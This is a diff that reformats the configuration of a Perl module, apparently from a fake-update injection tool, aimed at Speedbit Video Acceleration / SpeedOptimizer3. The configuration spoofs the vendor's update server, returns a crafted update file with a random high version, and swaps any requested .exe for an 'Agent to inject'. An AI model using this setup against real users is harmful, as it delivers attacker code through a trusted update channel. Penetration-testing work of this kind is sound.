@@ -25,47 +25,54 @@ package modules::speedbit;
 use strict;
 use Data::Dump qw(dump);
 
-my $base=
-{
-    'name' => 'Speedbit Video Acceleration / SpeedOptimizer3',
-    'version' => '1.1',
-    'appver' => '< 2.2.1.8 | 3.0',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com>' ],
-    'description' => qq{},    
-    'vh' => 'online.speedbit.com',
-    'request' => [
-		    {
-		    'req' => 'online/update.aspx', #regex friendly
-		    'type' => 'file', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => '0',
-		    'string' => "",
-		    'parse' => '1',
-		    'file' => './include/speedbit/speedbit_update.xml',
-		    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => '0',
-		    'file' => ''
-		    },
+my $base = {
+    'name'        => 'Speedbit Video Acceleration / SpeedOptimizer3',
+    'version'     => '1.1',
+    'appver'      => '< 2.2.1.8 | 3.0',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com>'],
+    'description' => qq{},
+    'vh'          => 'online.speedbit.com',
+    'request'     => [
+        {   'req'    => 'online/update.aspx',    #regex friendly
+            'type'   => 'file',                  #file|string|agent|install
+            'method' => '',                      #any
+            'bin'    => '0',
+            'string' => "",
+            'parse'  => '1',
+            'file' => './include/speedbit/speedbit_update.xml',
+        },
+        {   'req'    => '.exe',                  #regex friendly
+            'type'   => 'agent',                 #file|string|agent|install
+            'method' => '',                      #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => '0',
+            'file'   => ''
+        },
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-                   'version'  => { 'val' => "'9.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1)",
-                                 'hidden' => 1,
-				'dynamic' =>1,},		    
-                   'url'  => { 'val' => "'http://online.speedbit.com/speedbitupdate'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1)).'.exe'",
-                                 'hidden' => 1,
-				'dynamic' =>1,},                                                                                       			    	  
-		 }
-};
 
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'version' => {
+            'val' =>
+                "'9.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1).'.'.isrcore::utils::RndNum(1)",
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+        'url' => {
+            'val' =>
+                "'http://online.speedbit.com/speedbitupdate'.isrcore::utils::RndAlpha(isrcore::utils::RndNum(1)).'.exe'",
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+    }
+};
 
 ##########################################################################
 # FUNCTION      new
